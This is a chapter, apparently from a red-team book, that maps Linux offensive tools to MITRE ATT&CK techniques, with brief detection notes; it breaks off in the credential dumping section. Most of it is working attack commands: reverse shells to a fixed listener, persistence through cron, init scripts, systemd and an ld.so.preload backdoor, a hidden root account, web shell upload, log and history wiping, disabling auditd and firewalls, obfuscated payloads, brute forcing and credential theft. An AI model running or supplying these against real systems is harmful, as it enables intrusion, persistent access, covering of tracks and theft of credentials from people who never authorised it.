# Chapter 23: Mapping Tools to TTPs

## Introduction to MITRE ATT&CK Framework Integration

The effectiveness of a red team operation extends beyond simply identifying vulnerabilities. Modern red teaming must simulate realistic adversary behaviors to properly assess an organization's defensive capabilities. The MITRE ATT&CK (Adversarial Tactics, Techniques, and Procedures) framework provides a comprehensive knowledge base of adversary tactics and techniques based on real-world observations. By mapping your tools and techniques to this framework, you elevate your red team operations from isolated technical exercises to realistic adversary emulations.

This chapter explores how to integrate the MITRE ATT&CK framework into your red team toolkit, mapping specific Linux tools to established TTPs. We'll examine how each phase of a red team operation corresponds to ATT&CK tactics, and how the tools covered throughout this book implement specific techniques within the framework.

![MITRE ATT&CK Matrix](./images/attack_matrix.png)
*Figure 23.1: MITRE ATT&CK Enterprise Matrix showing tactics and techniques*

## Understanding the MITRE ATT&CK Framework

Before diving into specific tool mappings, it's essential to understand the structure and terminology of the ATT&CK framework.

### Framework Structure

The ATT&CK framework is organized hierarchically:

1. **Tactics** (the "why"): These represent the adversary's tactical goals during an operation. Examples include Initial Access, Execution, Persistence, and Exfiltration.

2. **Techniques** (the "how"): Specific methods used to achieve tactical goals. For example, under the Initial Access tactic, techniques include Phishing, Valid Accounts, and Exploit Public-Facing Application.

3. **Sub-techniques**: More specific variants of techniques. For instance, under Phishing, there are sub-techniques like Spearphishing Attachment, Spearphishing Link, and Spearphishing via Service.

4. **Procedures**: The specific implementation of techniques by threat actors or tools. This is where your red team tools and workflows come into play.

### ATT&CK IDs

Each technique and sub-technique in the ATT&CK framework has a unique identifier:

- Techniques are identified as **T####** (e.g., T1566 for Phishing)
- Sub-techniques are identified as **T####.###** (e.g., T1566.001 for Spearphishing Attachment)

These IDs provide a standardized way to reference specific adversary behaviors and make it easier to document and communicate your red team activities.

### ATT&CK Tactics Overview

The ATT&CK Enterprise framework currently includes 14 tactics, each representing a different phase or objective in an adversary operation:

| Tactic | ID | Description |
|--------|----|----|
| Reconnaissance | TA0043 | Gathering information to plan future operations |
| Resource Development | TA0042 | Establishing resources to support operations |
| Initial Access | TA0001 | Getting into your network |
| Execution | TA0002 | Running malicious code |
| Persistence | TA0003 | Maintaining access |
| Privilege Escalation | TA0004 | Gaining higher-level permissions |
| Defense Evasion | TA0005 | Avoiding detection |
| Credential Access | TA0006 | Stealing account names and passwords |
| Discovery | TA0007 | Understanding the environment |
| Lateral Movement | TA0008 | Moving through the environment |
| Collection | TA0009 | Gathering data of interest |
| Command and Control | TA0011 | Communicating with compromised systems |
| Exfiltration | TA0010 | Stealing data |
| Impact | TA0040 | Manipulating, interrupting, or destroying systems and data |

In the following sections, we'll map the Linux tools covered in this book to specific techniques within each of these tactics.

## Reconnaissance Techniques and Corresponding Tools

Reconnaissance involves gathering information about a target organization to inform subsequent attack phases. The MITRE ATT&CK framework identifies several techniques within this tactic.

### Active Scanning (T1595)

Active scanning involves probing target infrastructure to gather information about potential vulnerabilities and entry points.

#### Network Service Discovery (T1595.001)

The tools we've covered that implement this technique include:

**Nmap**: The quintessential network scanning tool covered in Chapter 1.
```bash
# Comprehensive service discovery
sudo nmap -sV -sC -p- 192.168.1.0/24 -oA network_scan
```

**Masscan**: Ultra-fast port scanner for large networks.
```bash
# Rapid port scanning across large IP ranges
sudo masscan -p1-65535 --rate=10000 192.168.0.0/16 -oL masscan_results.txt
```

**Specific ATT&CK Mapping**:
- Nmap's service version detection (`-sV`) directly maps to Network Service Discovery
- Masscan's rapid scanning capability enables large-scale service enumeration

**Detection Considerations**:
- Active scanning generates significant network traffic
- Security devices typically log connection attempts to multiple ports
- IDS/IPS systems often have signatures for common scan patterns

**Operational Security**:
```bash
# More stealth-oriented scan using Nmap timing controls
sudo nmap -sS -sV -T2 --source-port 53 --max-retries 1 --script-timeout 10s 192.168.1.0/24
```

#### Vulnerability Scanning (T1595.002)

Tools that implement vulnerability scanning include:

**OpenVAS**: Comprehensive vulnerability scanning framework.
```bash
# From the openvas-cli
omp -u admin -w password -C -n "External Scan" -t 192.168.1.0/24
```

**Nessus Essentials**: Targeted vulnerability discovery.
```bash
# Run through the web interface or using Nessus CLI
nessuscli scan new --name "Target Scan" --policy "Basic Network Scan" --targets 192.168.1.100
```

**Nikto**: Web server scanner focusing on vulnerabilities.
```bash
# Basic vulnerability scan of a web server
nikto -h 192.168.1.100 -p 80,443 -o nikto_results.html
```

**Specific ATT&CK Mapping**:
- OpenVAS's comprehensive scanning directly maps to T1595.002
- Nessus's vulnerability assessment capabilities identify potential entry points
- Nikto focuses specifically on web vulnerabilities, a subset of T1595.002

**Operational Recommendations**:
- Customize vulnerability scans to focus on likely entry points
- Prioritize scanning for vulnerabilities that match your target organization's profile
- Use scan results to inform later exploit development and targeting

### Gather Victim Host Information (T1592)

This involves collecting detailed information about target systems that can be used to plan attacks.

#### Hardware (T1592.001)

Tools for hardware reconnaissance include:

**Spiderfoot**: Automated OSINT platform.
```bash
# Run in CLI mode
spiderfoot -s "example.com" -m sfp_shodan,sfp_dnsresolve
```

**Specific ATT&CK Mapping**:
- Spiderfoot modules can identify hardware details through OSINT sources
- Information gathering about virtualization, hardware types, and network devices

#### Software (T1592.002)

Tools that help identify target software include:

**WhatWeb**: Website fingerprinting.
```bash
# Identify technologies used by a website
whatweb -a 3 https://example.com
```

**Wappalyzer CLI**: Technology detection.
```bash
# Detect technologies from the command line
wappalyzer https://example.com
```

**Specific ATT&CK Mapping**:
- WhatWeb specifically identifies web technologies, versions, and plugins
- Wappalyzer comprehensively maps website technology stacks
- Both tools help identify software that may have known vulnerabilities

**Operational Considerations**:
- Software version information is critical for planning exploitation strategies
- Focus on identifying outdated, unpatched, or misconfigured software
- Document all discovered technologies for later vulnerability matching

### Phishing for Information (T1598)

This technique involves sending phishing messages to elicit information from targets.

**Gophish**: Phishing campaign management.
```bash
# Run through the web interface (default at http://localhost:3333)
# CLI management also available
gocli campaigns list
```

**SET (Social Engineering Toolkit)**: Comprehensive social engineering framework.
```bash
# Launch the Social Engineering Toolkit
sudo setoolkit
# Select: 1) Social-Engineering Attacks
# Select: 2) Website Attack Vectors
# Select: 3) Credential Harvester Attack Method
```

**Specific ATT&CK Mapping**:
- Gophish's campaign management directly maps to T1598
- SET's credential harvester implements specific phishing techniques
- Both tools allow for customized phishing templates that match target organizations

**Red Team Considerations**:
- Ensure proper scope and authorization for phishing activities
- Develop organization-specific templates based on reconnaissance
- Track and document all collected information for later access attempts

### Search Open Technical Databases (T1596)

This technique involves gathering information from publicly available technical sources.

#### DNS (T1596.001)

Tools that implement DNS information gathering:

**Sublist3r**: Subdomain enumeration.
```bash
# Enumerate subdomains of a domain
sublist3r -d example.com -o subdomains.txt
```

**Amass**: Thorough DNS enumeration.
```bash
# Passive reconnaissance
amass enum -passive -d example.com -o amass_results.txt

# Active reconnaissance
amass enum -active -d example.com -src -ip -o amass_detailed.txt
```

**Specific ATT&CK Mapping**:
- Sublist3r maps directly to T1596.001 by discovering DNS information
- Amass performs comprehensive DNS reconnaissance including passive and active methods
- Both tools expand the attack surface by discovering previously unknown hosts

**Detection Considerations**:
- Active DNS enumeration can trigger security alerts for abnormal query volumes
- Passive techniques using third-party services are harder to detect
- Zone transfer attempts are typically logged and may be blocked

#### Scan Databases (T1596.005)

Tools that search vulnerability and configuration databases:

**Recon-ng**: Modular reconnaissance framework.
```bash
# Launch Recon-ng
recon-ng

# Use vulnerability database modules
> modules load recon/domains-vulnerabilities/xssed
> run
```

**Specific ATT&CK Mapping**:
- Recon-ng modules can search vulnerability databases for known issues
- Results can directly inform exploitation strategies

> **RED TEAM TIP:**
>
> Create a mapping document that links reconnaissance findings to potential attack vectors. For example:
>
> | Finding | Tool | ATT&CK Technique | Potential Attack Vector |
> |---------|------|------------------|------------------------|
> | Outdated Apache | Nikto | T1595.002 | CVE-2021-41773 Path Traversal |
> | Exchange Server | Nmap | T1595.001 | ProxyLogon Exploit Chain |
> | Exposed Git Repo | Spiderfoot | T1592.002 | Credential Extraction |
>
> This mapping helps prioritize attack paths during the execution phase.

## Initial Access Tools and Methods

Initial Access consists of techniques used to gain an initial foothold within a network. The tools covered in this book implement several important Initial Access techniques from the ATT&CK framework.

### Drive-by Compromise (T1189)

This involves compromising a system through a user visiting a website.

**BeEF (Browser Exploitation Framework)**:
```bash
# Start BeEF
cd /usr/share/beef-xss
./beef

# Use the web UI to create hook URLs and manage exploits
```

**Specific ATT&CK Mapping**:
- BeEF's browser hooking directly implements Drive-by Compromise
- Client-side exploitation targets users rather than systems

**Operational Considerations**:
- Use with social engineering for higher success rates
- Combine with credential harvesting for maximum impact
- Document all user interactions for reporting

### Exploit Public-Facing Application (T1190)

This technique involves exploiting vulnerabilities in public-facing applications to gain access.

**SQLmap**: SQL injection exploitation.
```bash
# Basic scan for SQL injection
sqlmap -u "https://example.com/page.php?id=1" --dbs

# Extract data from a vulnerable application
sqlmap -u "https://example.com/page.php?id=1" --dump
```

**Commix**: Command injection exploitation.
```bash
# Test for command injection
commix --url="https://example.com/search.php?query=test" --random-agent
```

**OWASP ZAP**: Web application vulnerability scanner.
```bash
# CLI mode for specific target
zap-cli quick-scan --self-contained --start-options "-config api.disablekey=true" https://example.com
```

**Specific ATT&CK Mapping**:
- SQLmap's SQL injection capabilities directly implement T1190
- Commix focuses on command injection, another public application exploit
- ZAP identifies multiple vulnerability types covered by T1190

**Detection Considerations**:
- Web application firewalls may detect and block exploitation attempts
- Application logs typically record unusual requests and parameters
- Successful exploits often generate error messages or unusual system behavior

**Operational Security**:
```bash
# More stealthy SQLmap usage
sqlmap -u "https://example.com/page.php?id=1" --random-agent --delay=3 --timeout=5 --retries=2 --level=2
```

### Phishing (T1566)

Phishing involves sending malicious emails or messages to gain access to systems or data.

#### Spearphishing Attachment (T1566.001)

Tools that implement spearphishing with attachments:

**Social Engineering Toolkit (SET)**:
```bash
# Launch SET and navigate to spearphishing
sudo setoolkit
# Select: 1) Social-Engineering Attacks
# Select: 1) Spear-Phishing Attack Vectors
# Select: 2) Create a File Format Payload
```

**Specific ATT&CK Mapping**:
- SET's spearphishing module directly implements T1566.001
- Payload generation within SET creates malicious attachments

**Operational Guidelines**:
- Create convincing context for the attachment
- Use file types that appear legitimate (PDF, Office documents)
- Test attachment delivery against common security products

#### Spearphishing Link (T1566.002)

Tools for phishing with malicious links:

**Gophish**: Phishing campaign management.
```bash
# Create campaign with malicious links via the web UI (http://localhost:3333)
# CLI management also available
gocli campaigns new --name "Security Update" --url "https://malicious.example.com"
```

**Specific ATT&CK Mapping**:
- Gophish's link-based campaigns implement T1566.002
- Campaign tracking provides metrics on effectiveness

### Valid Accounts (T1078)

This technique involves using legitimate credentials to gain access to systems.

**Hydra**: Online password attacks.
```bash
# SSH brute force using known username list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100
```

**Medusa**: Parallel login attacks.
```bash
# RDP brute force attack
medusa -h 192.168.1.100 -u administrator -P password_list.txt -M rdp
```

**CredNinja**: Credential validation.
```bash
# Validate credentials across a network
python cred_ninja.py -u administrator -p "Password123" -d example.com -t targets.txt
```

**Specific ATT&CK Mapping**:
- Hydra and Medusa implement brute force attacks to obtain valid credentials (T1078)
- CredNinja validates and tests stolen credentials across systems

**Detection Considerations**:
- Authentication failures are typically logged and may trigger alerts
- Successful authentication from unusual sources may be flagged
- Multiple failed attempts often trigger account lockouts

**Red Team Approach**:
```bash
# More targeted and cautious credential testing
hydra -l administrator -p "Spring2023!" -t 1 -f ssh://192.168.1.100
```

## Execution Frameworks and Utilities

Execution involves techniques used to run adversary-controlled code on local or remote systems. This tactic includes various methods for executing commands and scripts.

### Command and Scripting Interpreter (T1059)

This involves using command-line interfaces, scripting languages, or interpreters to execute commands.

#### Unix Shell (T1059.004)

Tools that leverage Unix shells for execution:

**Bash/Python One-liners**:
```bash
# Basic reverse shell
bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'

# Python reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Specific ATT&CK Mapping**:
- Shell-based reverse connections directly implement T1059.004
- Command interpreters provide powerful execution capabilities

**Operational Considerations**:
- Shell script execution may be monitored by EDR solutions
- Use encoding or obfuscation to avoid simple signature detection
- Consider environment variables and path issues when crafting commands

### Exploitation for Client Execution (T1203)

This involves exploiting client applications to execute code.

**Metasploit Browser Exploits**:
```bash
# Set up a browser exploit
use exploit/multi/browser/firefox_proto_crmfrequest
set payload firefox/shell_reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

**Specific ATT&CK Mapping**:
- Metasploit browser modules directly implement T1203
- Client-side execution often bypasses perimeter defenses

**Detection Considerations**:
- Browser exploit attempts may be detected by endpoint protection
- Successful exploitation often causes unusual process behavior
- Network traffic signatures may identify exploit attempts

### Inter-Process Communication (T1559)

This involves using inter-process communication mechanisms to execute code.

**D-Bus Exploitation**:
```bash
# List available D-Bus services
dbus-send --system --dest=org.freedesktop.DBus --type=method_call --print-reply /org/freedesktop/DBus org.freedesktop.DBus.ListNames

# Execute command via D-Bus (example)
dbus-send --system --dest=org.freedesktop.NetworkManager --type=method_call --print-reply /org/freedesktop/NetworkManager org.freedesktop.DBus.Properties.Get string:org.freedesktop.NetworkManager string:Version
```

**Specific ATT&CK Mapping**:
- D-Bus manipulation maps to T1559
- IPC mechanisms provide alternative execution paths

**Red Team Considerations**:
- IPC mechanisms are often less monitored than direct command execution
- System services may offer privileged execution through IPC
- Document IPC paths discovered during operations

### Native API (T1106)

This involves using native APIs to execute code.

**Python/C Libraries**:
```python
# Python using os.system
import os
os.system('id')

# Python using subprocess
import subprocess
subprocess.run(['whoami'], capture_output=True)
```

**Specific ATT&CK Mapping**:
- API calls for process creation implement T1106
- Native API usage can bypass shell monitoring

**Operational Security**:
- Consider using less common API calls to avoid detection
- Implement error handling to prevent crashes that might alert defenders
- Direct syscalls may evade userspace hooks in security products

### Scheduled Task/Job (T1053)

This involves using task scheduling functionality to execute code.

#### Cron (T1053.003)

Tools that use cron for execution:

**Crontab Manipulation**:
```bash
# Add a reverse shell to crontab
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'") | crontab -
```

**Specific ATT&CK Mapping**:
- Crontab manipulation directly implements T1053.003
- Scheduled tasks provide persistence and execution capabilities

**Detection Considerations**:
- Crontab changes may be captured in system logs
- Unusual scheduled tasks might be flagged in security audits
- Network connections from scheduled tasks may appear at predictable times

> **RED TEAM TIP:**
>
> When planning execution strategies, consider a matrix approach that maps multiple tools to each ATT&CK technique. This provides alternatives if one approach is blocked:
>
> | ATT&CK Technique | Primary Tool | Secondary Tool | Last Resort |
> |------------------|--------------|----------------|------------|
> | T1059.004 (Unix Shell) | Reverse Shell | Encoded Python | WebShell |
> | T1053.003 (Cron) | Direct crontab | Systemd Timer | At Job |
> | T1106 (Native API) | Python subprocess | Direct syscall | JNI Calls |
>
> This approach ensures operational resilience when defensive controls block your primary method.

## Persistence Mechanisms and Tools

Persistence involves techniques used to maintain access to systems despite restarts, credential changes, or other interruptions. Many tools in this book implement persistence techniques from the ATT&CK framework.

### Create Account (T1136)

This technique involves creating accounts on systems to maintain access.

#### Local Account (T1136.001)

Tools for local account creation:

**Standard Linux Commands**:
```bash
# Create a local user with root privileges
useradd -m -G sudo -s /bin/bash operatorx
echo "operatorx:P@ssw0rd123" | chpasswd

# Create a less obvious user
useradd -u 0 -o -g 0 -M -d /root -s /bin/bash hidden_root
echo "hidden_root:SuperSecret123" | chpasswd
```

**Specific ATT&CK Mapping**:
- Local account creation directly implements T1136.001
- Users with elevated privileges enable persistent system access

**Operational Considerations**:
- Use plausible usernames that blend with existing naming conventions
- Consider creating service accounts rather than user accounts
- Document all created accounts for proper cleanup after operations

### Boot or Logon Autostart Execution (T1547)

This involves configuring system mechanisms to automatically execute code during boot or logon.

#### RC Scripts (T1547.006)

Tools for RC script persistence:

**Init Script Manipulation**:
```bash
# Create a persistent init script
cat > /etc/init.d/service_helper << EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          service_helper
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: Service Helper
### END INIT INFO

case "\$1" in
  start)
    nohup bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' &
    ;;
esac
exit 0
EOF

chmod +x /etc/init.d/service_helper
update-rc.d service_helper defaults
```

**Specific ATT&CK Mapping**:
- Init script modification directly implements T1547.006
- Boot-time execution ensures persistence across system restarts

**Detection Considerations**:
- New or modified init scripts may trigger file integrity monitoring alerts
- Unusual network connections during boot sequence might be flagged
- Services without proper documentation may be identified during audits

#### Systemd Services (T1543.002)

Tools for systemd persistence:

**Systemd Unit Files**:
```bash
# Create a persistent systemd service
cat > /etc/systemd/system/helper.service << EOF
[Unit]
Description=System Helper Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

systemctl enable helper.service
systemctl start helper.service
```

**Specific ATT&CK Mapping**:
- Systemd service creation implements T1543.002
- Service configuration provides reliable persistence

**Red Team Considerations**:
- Name services to appear legitimate (e.g., network_monitor, update_service)
- Consider dependencies to control execution timing
- Use service description fields that seem authentic

### Cron (T1053.003)

Tools for cron-based persistence:

**Crontab Manipulation**:
```bash
# Add a persistent reverse shell to crontab
(crontab -l 2>/dev/null; echo "@reboot sleep 60 && bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'") | crontab -

# System-wide cron job
echo "*/30 * * * * root bash -c 'curl -s http://192.168.1.100/payload.sh | bash'" > /etc/cron.d/system_update
```

**Specific ATT&CK Mapping**:
- Crontab modification directly implements T1053.003
- Scheduled tasks provide both persistence and execution capabilities

**Operational Security**:
- Use realistic timing for scheduled tasks
- Consider rare schedules (e.g., once daily) to reduce detection chance
- Delay execution after boot to avoid immediate detection

### Compromise Client Software Binary (T1554)

This involves modifying legitimate binaries to maintain persistence.

**Binary Trojanization**:
```bash
# Extract binary
cp /usr/bin/legitimate_tool /tmp/

# Add malicious code (simplified example)
cat >> /tmp/malicious_addition.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void __attribute__((constructor)) init() {
    if (fork() == 0) {
        system("bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'");
        exit(0);
    }
}
EOF

# Compile the malicious addition
gcc -shared -fPIC /tmp/malicious_addition.c -o /tmp/malicious.so

# Replace the original binary
cp /tmp/malicious.so /usr/lib/
echo "/usr/lib/malicious.so" >> /etc/ld.so.preload
```

**Specific ATT&CK Mapping**:
- Binary modification implements T1554
- Trojanized software executes malicious code alongside legitimate functionality

**Detection Considerations**:
- File integrity monitoring may detect binary modifications
- Hash verification can identify altered executables
- Unusual library loading might trigger security alerts

### External Remote Services (T1133)

This involves using external remote access services for persistence.

**SSH Keys**:
```bash
# Generate an SSH key pair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/persistence_key -N ""

# Add to authorized keys on target
mkdir -p ~/.ssh
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys
```

**Specific ATT&CK Mapping**:
- SSH key deployment implements T1133
- Remote access services provide reliable persistence mechanism

**Red Team Approach**:
- Use multiple persistence mechanisms with different triggering conditions
- Implement dormant backdoors that activate only after specific conditions
- Document all persistence mechanisms for proper cleanup

### Weevely: Web Shell Management

**Weevely** provides a sophisticated web shell for web server persistence:

```bash
# Generate a web shell
weevely generate P@ssw0rd123 /tmp/shell.php

# Upload to target web server (method depends on initial access)
# Example using curl (if file upload vulnerability exists)
curl -F "file=@/tmp/shell.php" http://target.com/upload.php

# Connect to the web shell
weevely http://target.com/uploads/shell.php P@ssw0rd123
```

**Specific ATT&CK Mapping**:
- Web shell uploading maps to both persistence and web shell techniques (T1505.003)
- Weevely implements stealth features to evade detection

**Operational Considerations**:
- Web shells may be detected by web application firewalls
- File integrity monitoring can identify new or modified web files
- Select inconspicuous file names and locations for web shells

## Privilege Escalation Techniques and Tools

Privilege Escalation consists of techniques used to obtain higher-level permissions on a system or network. Many Linux tools we've covered implement these techniques.

### Exploitation for Privilege Escalation (T1068)

This involves exploiting software vulnerabilities to elevate privileges.

**Linux Exploit Suggester**:
```bash
# Run the tool to identify potential kernel exploits
./linux-exploit-suggester.sh

# Download and compile a suggested exploit
gcc -o exploit /tmp/cve_2021_4034.c
./exploit
```

**Specific ATT&CK Mapping**:
- Kernel exploit usage directly implements T1068
- Local privilege escalation exploits target vulnerable software

**Operational Guidance**:
- Test exploits in similar environments before deployment
- Have multiple exploit options available
- Document exploit reliability and potential system impacts

### Setuid and Setgid (T1548.001)

This involves using programs with the setuid or setgid bits set to elevate privileges.

**GTFOBins Techniques**:
```bash
# Find setuid binaries
find / -perm -4000 -type f 2>/dev/null

# Example: Using a setuid binary for privilege escalation
./setuid_binary -p
```

**Specific ATT&CK Mapping**:
- Exploiting setuid binaries implements T1548.001
- GTFOBins documents numerous setuid/setgid escalation techniques

**Detection Considerations**:
- Unusual use of setuid binaries may trigger behavioral analytics
- Process lineage (parent-child relationships) might reveal suspicious patterns
- Command-line parameters can indicate exploitation attempts

### Sudo and Sudo Caching (T1548.003)

This involves using sudo mechanisms to elevate privileges.

**Sudo Exploitation**:
```bash
# Check sudo privileges
sudo -l

# Example: If allowed to run a specific command
sudo awk 'BEGIN {system("/bin/bash")}'

# Leverage sudo credential caching
sudo -i
```

**Specific ATT&CK Mapping**:
- Sudo technique exploitation directly implements T1548.003
- Sudo caching provides temporary privilege elevation

**Red Team Approach**:
- Document sudo permissions for each compromised user
- Test multiple sudo exploitation paths
- Consider sudo token theft for extended privileges

### Process Injection (T1055)

This involves injecting code into running processes to elevate privileges or evade defenses.

**Linux Injector Tools**:
```bash
# Example of LD_PRELOAD injection
cat > inject.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    setuid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o inject.so inject.c -nostartfiles
sudo LD_PRELOAD=./inject.so /usr/bin/pinger
```

**Specific ATT&CK Mapping**:
- LD_PRELOAD manipulation implements process injection (T1055)
- Shared library injection allows code execution within privileged processes

> **RED TEAM TIP:**
>
> Develop a privilege escalation checklist for different Linux distributions:
>
> | Distribution | Primary Technique | Secondary Technique | Detection Considerations |
> |--------------|-------------------|---------------------|--------------------------|
> | Ubuntu 20.04 | PwnKit (CVE-2021-4034) | Dirty Pipe (Linux 5.8+) | System logs, process creation |
> | CentOS 7 | Overlayfs (CVE-2021-3493) | SUID binary abuse | File access patterns, audit logs |
> | Debian 11 | Kernel exploit | Sudo technique | Process monitoring, command history |
>
> This approach ensures you have multiple escalation options for each target environment.

## Defense Evasion Tools and Techniques

Defense Evasion consists of techniques used to avoid detection by security tools and analysts. This tactic includes methods for hiding artifacts, disabling security controls, and masking malicious activities.

### Disable or Modify Tools (T1562.001)

This involves disabling or modifying security tools to avoid detection.

**Security Tool Manipulation**:
```bash
# Disable auditd temporarily
sudo service auditd stop

# Modify syslog configuration
sudo mv /etc/rsyslog.conf /etc/rsyslog.conf.bak
sudo sh -c 'grep -v "auth\.\*" /etc/rsyslog.conf.bak > /etc/rsyslog.conf'
sudo service rsyslog restart
```

**Specific ATT&CK Mapping**:
- Security service manipulation directly implements T1562.001
- Configuration modification affects detection capabilities

**Operational Considerations**:
- Stopping security services may trigger alerts
- Consider temporary modifications rather than complete disabling
- Document original state for restoration during cleanup

### Impair Defenses: Disable or Modify System Firewall (T1562.004)

This involves modifying firewall settings to allow malicious traffic.

**Firewall Manipulation**:
```bash
# Disable firewall
sudo ufw disable
sudo systemctl stop firewalld

# Add permissive rules
sudo iptables -I INPUT -p tcp --dport 4444 -j ACCEPT
sudo iptables -I OUTPUT -p tcp --sport 4444 -j ACCEPT
```

**Specific ATT&CK Mapping**:
- Firewall rule modification implements T1562.004
- Permissive rules enable command and control traffic

**Detection Considerations**:
- Firewall configuration changes are often logged
- Complete disabling may trigger monitoring alerts
- Unusual rules might be identified during security audits

### Indicator Removal: File Deletion (T1070.004)

This involves removing files to eliminate evidence of activities.

**Log Manipulation**:
```bash
# Clear specific log entries
sudo sed -i '/192\.168\.1\.100/d' /var/log/auth.log

# Remove shell history
rm ~/.bash_history
ln -sf /dev/null ~/.bash_history
```

**Specific ATT&CK Mapping**:
- Log deletion directly implements T1070.004
- History file manipulation removes command evidence

**Red Team Guidance**:
- Use surgical removal rather than complete file deletion when possible
- Consider log rotation times when planning operations
- Plan cleanup operations in advance to ensure thoroughness

### Hidden Files and Directories (T1564.001)

This involves hiding files or information to evade detection.

**File Hiding Techniques**:
```bash
# Hide files with leading dot
mv backdoor.sh .service-temp.sh

# Use hidden directories
mkdir -p ~/.config/.hidden/
cp payload.elf ~/.config/.hidden/update-cache

# Use alternate data streams (Linux XFS)
getfattr -n user.stream payload.txt
setfattr -n user.stream -v "#!/bin/bash\nbash -i >& /dev/tcp/192.168.1.100/4444 0>&1" payload.txt
```

**Specific ATT&CK Mapping**:
- Hidden file usage implements T1564.001
- Alternate data streams provide additional hiding capabilities

**Operational Security**:
- Use system locations that are typically ignored in audits
- Leverage dotfiles and directories for hiding tools
- Consider timestamp manipulation to make files appear older

### Obfuscated Files or Information (T1027)

This involves obfuscating code or data to make it difficult to analyze.

**String Encoding**:
```bash
# Base64 encode a shell command
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' | base64
# Execute decoded command
bash -c "$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzQ0NDQgMD4mMQo= | base64 -d)"

# XOR encoding (using Python)
python3 -c 'import sys; cmd = "bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"; key = 42; print("".join(chr(ord(c) ^ key) for c in cmd))'
```

**Specific ATT&CK Mapping**:
- String encoding directly implements T1027
- Obfuscation evades simple string-based detection mechanisms

**Red Team Approach**:
- Use multi-layer encoding for critical payloads
- Combine encoding techniques with encryption when possible
- Test obfuscation effectiveness against target security tools

### Proxy: Multi-hop Proxy (T1090.003)

This involves using multiple proxies to disguise the source of traffic.

**ProxyChains Configuration**:
```bash
# Edit ProxyChains configuration
cat > /etc/proxychains.conf << EOF
strict_chain
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 9050
socks5 proxy1.example.com 1080
socks5 proxy2.example.com 1080
EOF

# Use multiple proxy hops
proxychains nmap -sT -P0 -p 80,443 target.com
```

**Specific ATT&CK Mapping**:
- Multi-proxy configuration implements T1090.003
- Proxy chaining obscures the true source of attack traffic

**Detection Considerations**:
- Proxy chains may introduce latency that appears unusual
- TLS inspection might reveal proxy usage patterns
- Connection timing can indicate multi-hop proxying

### AnonSurf: Anonymization Tool

**AnonSurf** (from Parrot OS) provides comprehensive traffic anonymization:

```bash
# Start anonymization
sudo anonsurf start

# Check status
sudo anonsurf status

# Stop anonymization
sudo anonsurf stop
```

**Specific ATT&CK Mapping**:
- Traffic anonymization implements multiple evasion techniques
- Tor routing provides multi-hop proxying (T1090.003)

> **RED TEAM TIP:**
>
> Create a layered defense evasion strategy for critical operations:
>
> 1. Start with traffic anonymization (AnonSurf/Tor)
> 2. Add system-level evasion (log cleaning, hidden directories)
> 3. Implement payload-level evasion (obfuscation, encoding)
> 4. Test the complete chain against representative security controls
>
> This defense-in-depth approach to evasion significantly improves operational security.

## Credential Access Specialized Tools

Credential Access consists of techniques used to steal credentials like account names and passwords. Many specialized tools in this book focus on credential theft and analysis.

### Brute Force (T1110)

This involves attempting to guess passwords for valid accounts.

#### Password Guessing (T1110.001)

Tools for password guessing:

**Hydra**: Online password attacks.
```bash
# SSH password guessing with username list
hydra -L users.txt -P passwords.txt ssh://192.168.1.100

# HTTP form-based authentication brute force
hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid credentials"
```

**Specific ATT&CK Mapping**:
- Hydra's password guessing implements T1110.001
- Form-based attacks target web applications

**Operational Considerations**:
- Account lockout policies may block brute force attempts
- Failed login attempts are typically logged
- Consider rate limiting to avoid detection

#### Password Spraying (T1110.003)

Tools for password spraying:

**Hydra with Common Passwords**:
```bash
# Password spraying against multiple accounts
hydra -L users.txt -p "Spring2023!" ssh://192.168.1.100
```

**Specific ATT&CK Mapping**:
- Using common passwords across multiple accounts implements T1110.003
- Password spraying avoids account lockouts

**Red Team Approach**:
- Use organization-specific password patterns based on policy
- Test during business hours to blend with normal traffic
- Implement delay between attempts to avoid detection

### Credentials from Password Stores (T1555)

This involves accessing password stores to obtain credentials.

**Browser Password Extraction**:
```bash
# Using LaZagne
python lazagne.py browsers

# Extract Firefox credentials
python lazagne.py firefox
```

**Specific ATT&CK Mapping**:
- Browser credential extraction implements T1555.003 (Credentials from Web Browsers)
- Password store access provides valuable account information

**Detection Considerations**:
- Unusual access to password databases may trigger alerts
- Browser process access patterns might indicate credential theft
- Memory scanning can detect credential extraction tools

### OS Credential Dumping (T1003)

This involves extracting credentials from operating system components.

#### /etc/shadow (T1003.008)

Tools for accessing password hashes:

**Shadow File Access**:
```bash
# Direct copy of password files
sudo cp /etc/shadow /tmp/shadow_copy

# Extract hashes for offline cracking
sudo unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt
```

**Specific ATT&CK Mapping**:
- Shadow file extraction directly implements T1003.008
